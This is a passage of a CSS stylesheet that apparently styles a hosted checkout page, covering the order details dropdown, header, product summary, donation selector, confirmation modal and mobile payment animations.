        .OrderDetails-remainingProductImages.has-threeImages .OrderDetails-remainingProductImageContainer:nth-child(3) {
            z-index: 1;
            left: 22px;
        }

        .OrderDetails-remainingProductImage {
            max-width: 100%;
            max-height: 100%;
            border-radius: 4px;
        }

        @media only screen and (min-width: 992px) {
            .OrderDetails-item.is-upsell {
                width: calc(100% + 32px);
                position: relative;
                left: -16px;
                margin-top: 8px;
            }
        }

        .OrderDetailsDropdown-modalOverlay {
            z-index: 11;
            background: transparent;
            display: block;
        }

        .OrderDetailsDropdown-modalOverlay.ModalOverlay--beforeClose:before {
            opacity: 0;
            transition-duration: 0.25s;
        }

        .OrderDetailsDropdown-modalOverlay.ModalOverlay--beforeClose {
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
            opacity: 1;
        }

        .OrderDetailsDropdown-modal {
            padding-top: 60px;
            background-color: #fff;
            border-radius: 0;
            -webkit-transform: translateY(calc(-100% + 60px));
            -ms-transform: translateY(calc(-100% + 60px));
            transform: translateY(calc(-100% + 60px));
            transition: -webkit-transform 0.4s cubic-bezier(0.35, 0.25, 0.1, 1);
            transition: transform 0.4s cubic-bezier(0.35, 0.25, 0.1, 1);
            transition: transform 0.4s cubic-bezier(0.35, 0.25, 0.1, 1), -webkit-transform 0.4s cubic-bezier(0.35, 0.25, 0.1, 1);
            opacity: 1;
            max-height: 100%;
        }

        .OrderDetailsDropdown-modal:not(.is-lineItemsListExpanded) {
            overflow: hidden;
        }

        .is-darkMode .OrderDetailsDropdown-modal {
            transition: background-color 0.4s ease-out;
            background-color: #101010;
        }

        .OrderDetailsDropdown-modal.ModalContent--afterOpen {
            box-shadow: 0 24px 32px rgba(0, 0, 0, 0.1);
            -webkit-transform: translateY(-1px);
            -ms-transform: translateY(-1px);
            transform: translateY(-1px);
        }

        .OrderDetailsDropdown-modal.ModalContent--beforeClose {
            -webkit-transform: translateY(calc(-100% + 60px));
            -ms-transform: translateY(calc(-100% + 60px));
            transform: translateY(calc(-100% + 60px));
            transition: box-shadow 0.25s cubic-bezier(0.35, 0.25, 0.1, 1), -webkit-transform 0.25s cubic-bezier(0.35, 0.25, 0.1, 1);
            transition: transform 0.25s cubic-bezier(0.35, 0.25, 0.1, 1), box-shadow 0.25s cubic-bezier(0.35, 0.25, 0.1, 1);
            transition: transform 0.25s cubic-bezier(0.35, 0.25, 0.1, 1), box-shadow 0.25s cubic-bezier(0.35, 0.25, 0.1, 1), -webkit-transform 0.25s cubic-bezier(0.35, 0.25, 0.1, 1);
            box-shadow: 0 24px 32px transparent;
        }

        .OrderDetailsDropdown {
            padding: 0 16px 16px;
        }

        .OrderDetailsDropdown-orderDetails {
            max-width: 380px;
            margin: auto;
        }

        .Tag {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            padding: 2px 4px;
            border-radius: 4px;
        }

        .Tag-orange {
            background-color: #ffde92;
        }

        .Tag-red {
            background-color: #fde2dd;
        }

        .Header {
            z-index: 12;
            min-height: 28px;
        }

        .Header-businessLink {
            display: block;
            margin-left: -24px;
            padding-left: 24px;
            min-width: 60px;
        }

        .Header:not(.is-darkBackground) .Header-merchantLogoWithLabel .Text {
            color: rgba(26, 26, 26, 0.9);
        }

        .Header-business .Header-backArrow {
            opacity: 0.4;
            -webkit-transform: translateX(0);
            -ms-transform: translateX(0);
            transform: translateX(0);
            transition: opacity 0.25s ease, width 0.25s ease, -webkit-transform 0.25s ease;
            transition: opacity 0.25s ease, transform 0.25s ease, width 0.25s ease;
            transition: opacity 0.25s ease, transform 0.25s ease, width 0.25s ease, -webkit-transform 0.25s ease;
        }

        .Header-business .Header-backArrowContainer,
        .Header-business .Header-merchantLogoContainer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .Header:not(.is-darkBackground) .Header-business .Header-backArrow {
            fill: rgba(26, 26, 26, 0.9);
        }

        .App-Overview.is-darkBackground .Header-business .Header-backArrow,
        .Body--modal-open .App-Overview .Header.is-darkBackground .Header-business .Header-backArrow {
            fill: #fff;
        }

        .Header-businessLink:focus .Header-backArrow,
        .Header-businessLink:hover .Header-backArrow {
            opacity: 1;
            -webkit-transform: translateX(-2px);
            transform: translateX(-2px);
            -ms-transform: translateX(4px);
        }

        .Header-business .Header-businessLink-label {
            opacity: 0;
            position: absolute;
            left: 0;
            -webkit-transform: translateX(4px);
            transform: translateX(4px);
            -ms-transform: translateX(4px) translateY(-50%);
            transition: opacity 0.1s ease 0ms, -webkit-transform 0.1s ease 0ms;
            transition: opacity 0.1s ease 0ms, transform 0.1s ease 0ms;
            transition: opacity 0.1s ease 0ms, transform 0.1s ease 0ms, -webkit-transform 0.1s ease 0ms;
        }

        .Header-businessLink.is-notClickable,
        .Header-businessLink:focus .Header-businessLink-label--noPointerEvents,
        .Header-businessLink:hover .Header-businessLink-label--noPointerEvents {
            pointer-events: none;
        }

        @media only screen and (min-width: 576px) {
            .Header-business .Header-backArrow {
                -webkit-transform: translateX(-20px);
                transform: translateX(-20px);
                -ms-transform: translateX(-20px) translateY(-50%);
                position: absolute;
            }

            .Header-businessLink:focus .Header-backArrow,
            .Header-businessLink:hover .Header-backArrow {
                -webkit-transform: translateX(-22px);
                transform: translateX(-22px);
                -ms-transform: translateX(-22px) translateY(-50%);
            }

            .Header-businessLink:focus .Header-businessLink-label,
            .Header-businessLink:hover .Header-businessLink-label {
                opacity: 1;
                -webkit-transform: none;
                transform: none;
                -ms-transform: translateY(-50%);
                transition: opacity 0.25s ease 50ms, -webkit-transform 0.25s ease 50ms;
                transition: opacity 0.25s ease 50ms, transform 0.25s ease 50ms;
                transition: opacity 0.25s ease 50ms, transform 0.25s ease 50ms, -webkit-transform 0.25s ease 50ms;
            }

            .Header-businessLink.Header-businessLink--paymentsuccess:focus .Header-businessLink-label,
            .Header-businessLink.Header-businessLink--paymentsuccess:hover .Header-businessLink-label {
                opacity: 0;
            }

            .Header-businessLink .HeaderImage--logo {
                transition: opacity 0.25s ease 0.1s, -webkit-transform 0.25s ease 0.1s;
                transition: opacity 0.25s ease 0.1s, transform 0.25s ease 0.1s;
                transition: opacity 0.25s ease 0.1s, transform 0.25s ease 0.1s, -webkit-transform 0.25s ease 0.1s;
            }

            .Header-businessLink:focus .HeaderImage--icon,
            .Header-businessLink:focus .HeaderImage--logo,
            .Header-businessLink:hover .HeaderImage--icon,
            .Header-businessLink:hover .HeaderImage--logo {
                opacity: 0;
                transition: opacity 0.1s ease 0ms, -webkit-transform 0.1s ease 0ms;
                transition: opacity 0.1s ease 0ms, transform 0.1s ease 0ms;
                transition: opacity 0.1s ease 0ms, transform 0.1s ease 0ms, -webkit-transform 0.1s ease 0ms;
                -webkit-transform: translateX(-2px);
                -ms-transform: translateX(-2px);
                transform: translateX(-2px);
            }

            .Header-businessLink.Header-businessLink--paymentsuccess:focus .HeaderImage--icon,
            .Header-businessLink.Header-businessLink--paymentsuccess:focus .HeaderImage--logo,
            .Header-businessLink.Header-businessLink--paymentsuccess:hover .HeaderImage--icon,
            .Header-businessLink.Header-businessLink--paymentsuccess:hover .HeaderImage--logo {
                opacity: 1;
                -webkit-transform: translateX(0);
                -ms-transform: translateX(0);
                transform: translateX(0);
            }

            .Header-businessLink .HeaderImage--icon {
                transition: opacity 0.25s ease, -webkit-transform 0.25s ease;
                transition: opacity 0.25s ease, transform 0.25s ease;
                transition: opacity 0.25s ease, transform 0.25s ease, -webkit-transform 0.25s ease;
            }

            .Header-businessLink .Header-businessLink-name {
                transition: opacity 0.25s ease 0.1s, -webkit-transform 0.25s ease 0.1s;
                transition: opacity 0.25s ease 0.1s, transform 0.25s ease 0.1s;
                transition: opacity 0.25s ease 0.1s, transform 0.25s ease 0.1s, -webkit-transform 0.25s ease 0.1s;
            }

            .Header-businessLink:focus .Header-businessLink-name,
            .Header-businessLink:hover .Header-businessLink-name {
                opacity: 0;
                transition: opacity 0.1s ease 0ms, -webkit-transform 0.1s ease 0ms;
                transition: opacity 0.1s ease 0ms, transform 0.1s ease 0ms;
                transition: opacity 0.1s ease 0ms, transform 0.1s ease 0ms, -webkit-transform 0.1s ease 0ms;
                -webkit-transform: translateX(-2px);
                -ms-transform: translateX(-2px);
                transform: translateX(-2px);
            }

            .Header-businessLink .Tag {
                transition: opacity 0.1s ease;
            }

            .Header-businessLink:focus .Tag,
            .Header-businessLink:hover .Tag {
                opacity: 0;
            }
        }

        .Header-merchantLogoWithLabel {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            width: 100%;
        }

        .Header-merchantLogoWithLabel > * {
            -webkit-box-flex: 0;
            -webkit-flex: 0 1 auto;
            -ms-flex: 0 1 auto;
            flex: 0 1 auto;
            min-width: 0;
            max-width: 100%;
        }

        .Header-merchantLogoWithLabel .HeaderImage {
            -webkit-flex-basis: auto;
            -ms-flex-preferred-size: auto;
            flex-basis: auto;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
        }

        .Header-actions,
        .Header-testTagMobile {
            display: none;
        }

        .Header-viewDetailsButton {
            width: 100%;
            position: relative;
            transition: opacity 0.25s ease;
            text-align: right;
        }

        .Header:not(.is-darkBackground) .Header-viewDetailsButton .Text {
            color: rgba(26, 26, 26, 0.5);
        }

        .Header:not(.is-darkBackground) .Header-viewDetailsButton .Text.Header-totalAmount {
            color: #1a1a1a;
        }

        .Header:not(.is-darkBackground) .Header-viewDetailsButton svg {
            fill: rgba(26, 26, 26, 0.4);
        }

        .Header.is-darkBackground .Header-viewDetailsButton .Text {
            color: hsla(0, 0%, 100%, 0.5);
        }

        .Header.is-darkBackground .Header-viewDetailsButton .Text.Header-totalAmount {
            color: #fff;
        }

        .Header.is-darkBackground .Header-viewDetailsButton svg {
            fill: hsla(0, 0%, 100%, 0.4);
        }

        .Header-couponIcon {
            margin-top: 4px;
            margin-right: 8px;
        }

        @media only screen and (max-width: 991.98px) {
            .Header .Header-actions .Button-Icon {
                transition: -webkit-transform 0.25s cubic-bezier(0.35, 0.25, 0.1, 1);
                transition: transform 0.25s cubic-bezier(0.35, 0.25, 0.1, 1);
                transition: transform 0.25s cubic-bezier(0.35, 0.25, 0.1, 1), -webkit-transform 0.25s cubic-bezier(0.35, 0.25, 0.1, 1);
            }

            .Header.is-orderDetailsDropdownOpen .Header-actions .Button-Icon {
                -webkit-transform: rotate(-180deg);
                -ms-transform: rotate(-180deg);
                transform: rotate(-180deg);
            }

            .Header.is-orderDetailsDropdownOpen .Header-businessLink.is-notClickable {
                pointer-events: none;
            }

            .Header-testTag {
                display: none;
            }

            .Header-testTagMobile {
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
            }

            .Header-productImage {
                position: relative;
            }

            .Header-productImage img {
                display: block;
                border-radius: 3px;
                width: 20px;
                height: 20px;
                -o-object-fit: cover;
                object-fit: cover;
            }

            .Header-productImage--withMarginRight {
                margin-right: 8px;
            }

            .Header-totalItemCount {
                width: 16px;
                height: 16px;
                color: #000;
                background-color: #fff;
                box-shadow: 0 2px 5px rgba(50, 50, 93, 0.1), 0 1px 1px rgba(0, 0, 0, 0.07);
                right: -6px;
                bottom: -6px;
                font-weight: 700;
                padding: 4px;
                border-radius: 50%;
                font-size: 9px;
                -webkit-box-pack: center;
                -webkit-justify-content: center;
                -ms-flex-pack: center;
                justify-content: center;
            }

            .Header-detailsLabel,
            .Header-totalItemCount {
                position: absolute;
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                -webkit-box-align: center;
                -webkit-align-items: center;
                -ms-flex-align: center;
                align-items: center;
            }

            .Header-detailsLabel {
                max-width: 105px;
                right: 20px;
            }

            .Header-viewDetailsButton .Text {
                width: 100%;
                display: block;
            }

            .Header:not(.is-darkBackground) .Header-business .Header-backArrow {
                fill: rgba(26, 26, 26, 0.9);
            }

            .App--multiItem .Header-actions {
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                width: 125px;
            }

            .App--multiItem .Header {
                height: 60px;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                margin-bottom: 0;
                padding: 16px;
                transition: background-color 0.15s ease, box-shadow 0.15s ease-out;
            }

            .App-Container.is-noBackground .Header {
                background-color: #fff;
            }

            .App--multiItem .Header-Content {
                max-width: 380px;
                margin: auto;
            }

            .App-Container:not(is-noBackground) .Header--withShadow,
            .Body--modal-open .App-Container:not(is-noBackground) .Header {
                background-color: #fff;
            }

            .App--multiItem .Header--withShadow {
                overflow-y: hidden;
                box-shadow: 0 1px 0 rgba(0, 0, 0, 0.05);
            }

            .is-darkMode .App-Container:not(is-noBackground) .Header--withShadow,
            .is-darkMode.Body--modal-open .App-Container:not(is-noBackground) .Header {
                background-color: #101010;
            }

            .is-darkMode .App-Container--setupMode .Header {
                background-color: transparent;
                color: hsla(0, 0%, 100%, 0.9);
            }
        }

        .InvalidSession {
            text-align: center;
        }

        .InvalidSession-icon {
            margin-bottom: 16px;
            height: 64px;
        }

        .InvalidSession-message,
        .InvalidSession-title {
            margin-bottom: 16px;
        }

        .PaymentFailure {
            text-align: center;
        }

        .PaymentFailure-icon {
            margin-bottom: 16px;
            height: 64px;
        }

        .PaymentFailure-title {
            margin-bottom: 16px;
        }

        .PaymentFailure-backLink {
            margin-top: 24px;
            font-size: 14px;
        }

        .PaymentFailure-message,
        .UpiAwaitNotification-iconContainer {
            margin-bottom: 16px;
        }

        .UpiAwaitNotification-description {
            text-align: center;
            width: 380px;
        }

        .UpiAwaitNotification-backLink {
            margin-top: 24px;
            font-size: 14px;
        }

        .DonationAmountSelector {
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            margin-top: 8px;
            margin-bottom: 16px;
            -webkit-box-ordinal-group: 2;
            -webkit-order: 1;
            -ms-flex-order: 1;
            order: 1;
        }

        .DonationAmountSelector-selectorButton {
            width: 30%;
            border-width: 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.07), 0 1px 1.5px rgba(0, 0, 0, 0.05), 0 0 0 1px rgba(0, 0, 0, 0.08);
            font-size: 12px;
        }

        .DonationAmountSelector-activeSelectorButton {
            width: 38%;
            border-width: 2px;
            box-shadow: 0 2px 5px rgba(50, 50, 93, 0.1), 0 1px 1.5px rgba(0, 0, 0, 0.07);
            font-size: 14px;
        }

        .DonationAmountSelector-activeSelectorButton:focus {
            outline: none;
            box-shadow: none;
        }

        .DonationAmountSelector-midSelectorButton {
            margin-left: 1%;
            margin-right: 1%;
        }

        @media only screen and (min-width: 992px) {
            .DonationAmountSelector {
                -webkit-box-pack: left;
                -webkit-justify-content: left;
                -ms-flex-pack: left;
                justify-content: left;
                -webkit-box-ordinal-group: 1;
                -webkit-order: 0;
                -ms-flex-order: 0;
                order: 0;
            }

            .DonationAmountSelector-selectorButton {
                width: 25%;
                font-size: 12px;
            }

            .DonationAmountSelector-activeSelectorButton {
                width: 48%;
                font-size: 16px;
            }
        }

        .ProductImage-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            position: relative;
            text-align: center;
            height: 120px;
        }

        .ProductImage-image {
            max-width: 100%;
            max-height: 120px;
            border-radius: 6px;
        }

        .ProductImage-totalItemsCount {
            position: absolute;
            left: 0;
            right: 0;
            margin-left: auto;
            margin-right: auto;
            bottom: -10px;
            box-shadow: 0 2px 5px 0 rgba(50, 50, 93, 0.1), 0 1px 1px 0 rgba(0, 0, 0, 0.07);
            background: #fff;
            text-align: center;
            border-radius: 70px;
            padding: 2px 7px;
            font-size: 13px;
            font-weight: 700;
            width: -webkit-fit-content;
            width: -moz-fit-content;
            width: fit-content;
            min-width: 92px;
            max-width: 135px;
        }

        .App-Container.is-squareBordered .ProductImage-image {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .ProductImage-image {
            border-radius: 36px;
        }

        .App-Overview.is-darkBackground .ProductImage-container .ProductImage-totalItemsCount .Text,
        .ProductImage-container .ProductImage-totalItemsCount .Text {
            padding-left: 4px;
            color: #1a1a1a;
        }

        .ProductImage-container .ProductImage-totalItemsChevronRight {
            margin-right: -4px;
        }

        @media only screen and (min-width: 992px) {
            .App--singleItem .ProductImage-image {
                max-height: 300px;
                max-width: 300px;
            }

            .ProductImage-totalItemsCount {
                display: none;
            }
        }

        .ProductSummaryDescription {
            margin-bottom: 4px;
        }

        .ProductSummaryDescription--padded {
            margin-top: 16px;
        }

        @media only screen and (min-width: 992px) {
            .App--multiItem .ProductSummaryDescription--singleItem {
                display: none;
            }
        }

        .ProductSummaryTotalAmount .BillingIntervalBreak {
            display: none;
        }

        .ProductSummaryTotalAmount-billingInterval {
            display: inline-block;
        }

        @media only screen and (min-width: 992px) {
            .ProductSummaryTotalAmount .BillingIntervalBreak {
                display: unset;
            }
        }

        @media only screen and (max-width: 991.98px) {
            .ProductSummaryTotalAmount {
                -webkit-box-pack: center;
                -webkit-justify-content: center;
                -ms-flex-pack: center;
                justify-content: center;
            }
        }

        .ProductSummary {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            text-align: center;
        }

        .ProductSummary,
        .ProductSummary-info {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
        }

        .ProductSummary-productImageContainer {
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            margin: 0 32px 16px;
        }

        .ProductSummary-info.is-clickable,
        .ProductSummary-productImageContainer.is-clickable {
            cursor: pointer;
        }

        .ProductSummary-totalAmount {
            margin: 2px 0 3px;
            font-size: 28px;
        }

        .ProductSummary-detailsPrompt {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            cursor: pointer;
        }

        .is-fontFamily--Inconsolata .ProductSummary-name {
            font-size: 17px;
        }

        .is-fontFamily--Inconsolata .ProductSummary-totalAmount {
            font-size: 29px;
        }

        .is-fontFamily--Inconsolata .ProductSummary-description {
            font-size: 15px;
        }

        .is-fontFamily--PTSans .ProductSummary-name {
            font-size: 17px;
        }

        .is-fontFamily--PTSans .ProductSummary-totalAmount {
            font-size: 29px;
        }

        .is-fontFamily--PTSans .ProductSummary-description {
            font-size: 15px;
        }

        .is-fontFamily--TitilliumWeb .ProductSummary-name {
            font-size: 17px;
        }

        .is-fontFamily--TitilliumWeb .ProductSummary-totalAmount {
            font-size: 29px;
        }

        .is-fontFamily--TitilliumWeb .ProductSummary-description {
            font-size: 15px;
        }

        @media only screen and (min-width: 992px) {
            .ProductSummary {
                text-align: left;
                -webkit-box-pack: left;
                -webkit-justify-content: left;
                -ms-flex-pack: left;
                justify-content: left;
                -webkit-box-align: start;
                -webkit-align-items: flex-start;
                -ms-flex-align: start;
                align-items: flex-start;
                margin-top: 32px;
            }

            .ProductSummary-totalAmount {
                font-size: 36px;
            }

            .ProductSummary-detailsPrompt {
                display: none;
            }

            .ProductSummary-info.is-clickable,
            .ProductSummary-productImageContainer.is-clickable {
                cursor: default;
                pointer-events: none;
            }
        }

        .App--singleItem .ProductSummary {
            margin-top: 32px;
        }

        .App--multiItem .ProductSummary-productImageContainer {
            margin-bottom: 32px;
        }

        @media only screen and (min-width: 992px) {
            .App--singleItem .ProductSummary {
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -webkit-flex-direction: column;
                -ms-flex-direction: column;
                flex-direction: column;
            }

            .App--singleItem .ProductSummary-productImageContainer {
                -webkit-box-ordinal-group: 3;
                -webkit-order: 2;
                -ms-flex-order: 2;
                order: 2;
                width: 300px;
                height: 300px;
                margin: 32px 0;
            }

            .App--singleItem .ProductSummary-info {
                -webkit-box-ordinal-group: 2;
                -webkit-order: 1;
                -ms-flex-order: 1;
                order: 1;
            }

            .App--multiItem .ProductSummary-productImageContainer {
                display: none;
            }
        }

        .ConfirmModalContent {
            margin: 24px 20px;
            overflow: hidden;
        }

        .ConfirmModalContent-icon {
            height: 16px;
            min-width: 24px;
            padding-right: 8px;
            color: rgba(0, 0, 0, 0.5);
        }

        .ConfirmModalContent--green .ConfirmModalContent-icon {
            color: #24b47e;
        }

        .ConfirmModalContent--yellow .ConfirmModalContent-icon {
            color: #d97917;
        }

        .ConfirmModalContent--red .ConfirmModalContent-icon {
            color: #dc2727;
        }

        .ConfirmModalFooter {
            margin: 16px 20px;
            height: 48px;
            position: relative;
        }

        .ConfirmModalFooter-btnContainer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            opacity: 1;
            width: 50%;
            position: absolute;
            overflow-x: hidden;
            padding: 4px;
        }

        .ConfirmModalFooter-btn {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            height: 38px;
            position: relative;
        }

        .ConfirmModalFooter-btn .Button-Icon.Button-Spinner {
            margin-right: 0;
        }

        .ConfirmModalFooter-btn svg {
            position: absolute;
            right: 12px;
        }

        .ConfirmModalFooter-btn .Button--secondary {
            height: 39px;
        }

        .ConfirmModalFooter-btn--gray:not(:disabled):hover {
            background-color: rgba(26, 26, 26, 0.05);
        }

        .ConfirmModalFooter-btn,
        .ConfirmModalFooter-btn .Text {
            transition: all 0.2s ease;
        }

        .ConfirmModalFooter-btn:disabled .Text {
            opacity: 0.6;
        }

        .AdjustQuantityModal-modal.has-notice .ConfirmModalFooter {
            margin-top: 8px;
        }

        .ConfirmModalHeader-header {
            border-bottom: 1px solid rgba(26, 26, 26, 0.1);
            padding: 16px 20px;
        }

        .ConfirmModalHeader-closeBtn {
            padding: 8px;
            border-radius: 20px;
        }

        .ConfirmModalHeader-imageContainer {
            width: 32px;
            height: 32px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            position: relative;
        }

        .ConfirmModalHeader-image {
            max-width: 100%;
            max-height: 100%;
            border-radius: 4px;
        }

        .ConfirmModalHeader-closeBtn:focus {
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
            outline: none;
        }

        .ConfirmModalHeader-closeBtn .Button-Icon {
            margin-right: 0;
        }

        .ConfirmModal-modal {
            width: 356px;
        }

        .ConfirmModal-content {
            padding: 16px 20px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            padding: 24px 20px 16px;
            overflow-y: hidden;
        }

        .ConfirmModal-notice {
            margin-top: 20px;
        }

        @media only screen and (max-width: 991.98px) {
            .ConfirmModal-modal {
                -webkit-align-self: flex-end;
                -ms-flex-item-align: end;
                align-self: flex-end;
                width: 100%;
                -webkit-transform: translateY(60%);
                -ms-transform: translateY(60%);
                transform: translateY(60%);
                border-bottom-left-radius: 0;
                border-bottom-right-radius: 0;
            }

            .ConfirmModal-modalOverlay:before {
                -webkit-filter: blur(0);
                filter: blur(0);
            }

            .ConfirmModal-modalOverlay.ModalOverlay--afterOpen:before {
                opacity: 1;
            }

            .ConfirmModal-modal.ModalContent--afterOpen {
                -webkit-transform: translateY(0);
                -ms-transform: translateY(0);
                transform: translateY(0);
            }

            .ConfirmModal-modal.ModalContent--beforeClose {
                -webkit-transform: translateY(100%);
                -ms-transform: translateY(100%);
                transform: translateY(100%);
            }

            .ConfirmModal-modalOverlay.ModalOverlay--beforeClose:before {
                opacity: 0;
                transition-duration: 0.25s;
            }

            .ConfirmModal-modalOverlay.ModalOverlay--beforeClose {
                -webkit-transform: none;
                -ms-transform: none;
                transform: none;
                opacity: 1;
            }
        }

        .MobilePaymentMenu-buttonOrDivider {
            margin-top: 16px;
            position: relative;
        }

        .MobilePaymentMenu .Divider {
            padding-top: 16px;
            padding-bottom: 32px;
        }

        .MobilePaymentMenu-payAnotherWay {
            width: 100%;
            height: 44px;
        }

        .App-Background {
            position: fixed;
            top: 0;
            bottom: 0;
            right: 0;
            left: 0;
            z-index: -1;
        }

        .App-Container {
            min-height: 100vh;
        }

        .App-Container:not(.is-noBackground) {
            background-image: linear-gradient(180deg, transparent, transparent 500px, #fff 0, #fff);
        }

        .App {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            width: 100%;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            margin-top: 0;
        }

        .App.App--multiItem {
            padding-top: 76px;
        }

        .App.App--singleItem {
            padding-top: 16px;
        }

        .App-mobileActions > *,
        .App-Overview,
        .App-Payment > * {
            max-width: 380px;
            margin: 0 auto;
        }

        .App-mobileActions,
        .App-Overview,
        .App-Payment {
            width: 100%;
            padding: 0 16px 16px;
        }

        .App-Payment {
            padding-top: 24px;
            background-color: #fff;
        }

        .is-darkMode .App-Payment {
            background-color: #000;
        }

        .App-Container:not(.is-noBackground) .App-Payment {
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.04);
        }

        .App-Overview-OrderDetails {
            max-height: 50vh;
            overflow-y: auto;
            padding-right: 8px;
            display: none;
        }

        .App-Overview-OrderDetails.OrderDetails.is-upsell {
            overflow-y: visible;
        }

        .App-Footer {
            padding-top: 16px;
            padding-bottom: 32px;
            background-color: #fff;
            width: 100%;
            -webkit-box-flex: 1;
            -webkit-flex: 1 1 auto;
            -ms-flex: 1 1 auto;
            flex: 1 1 auto;
        }

        .App-Container.is-mobilePaymentMenu .App-Background {
            z-index: 0;
        }

        .App-Container.is-mobilePaymentMenu .App-Overview {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
        }

        .App-Container.is-mobilePaymentMenu .App-productSummaryContainer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            padding: 0 16px;
        }

        .App-Container.is-mobilePaymentMenu .App-Footer {
            -webkit-box-flex: 0;
            -webkit-flex-grow: 0;
            -ms-flex-positive: 0;
            flex-grow: 0;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end;
        }

        .App-Container.is-mobilePaymentMenu .App-Payment {
            -webkit-box-flex: 0;
            -webkit-flex-grow: 0;
            -ms-flex-positive: 0;
            flex-grow: 0;
            padding-bottom: 32px;
        }

        .App-Container.is-mobilePaymentMenu .Header-actions,
        .App-Container.is-mobilePaymentMenu .Header-business {
            opacity: 0;
            -webkit-animation: fadeIn 0.2s ease-in;
            animation: fadeIn 0.2s ease-in;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
            -webkit-animation-delay: 0.4s;
            animation-delay: 0.4s;
        }

        .App-Container.is-mobilePaymentMenu .ProductSummary {
            opacity: 0;
            -webkit-animation: fadeIn 0.2s ease-in;
            animation: fadeIn 0.2s ease-in;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
            -webkit-animation-delay: 0.6s;
            animation-delay: 0.6s;
        }

        .App-Container.is-mobilePaymentMenu .App-Footer .CheckoutFooter-link,
        .App-Container.is-mobilePaymentMenu .App-Footer .Link {
            opacity: 0;
            -webkit-animation: fadeIn 0.2s ease-in;
            animation: fadeIn 0.2s ease-in;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
            -webkit-animation-delay: 0.8s;
            animation-delay: 0.8s;
        }

        .App-Container.is-mobilePaymentMenu .App-Payment {
            -webkit-transform: translateY(180px);
            -ms-transform: translateY(180px);
            transform: translateY(180px);
            -webkit-animation: slideUp 0.2s ease-in-out;
            animation: slideUp 0.2s ease-in-out;
            -webkit-animation-delay: 1s;
            animation-delay: 1s;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
        }

        .App-Container.is-mobilePaymentMenu .MobilePaymentMenu-payAnotherWay,
        .App-Container.is-mobilePaymentMenu .MobilePaymentMenu .PaymentRequestButtonContainer {
            opacity: 0;
            -webkit-animation: fadeIn 0.2s ease-in;
            animation: fadeIn 0.2s ease-in;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
            -webkit-animation-delay: 1.2s;
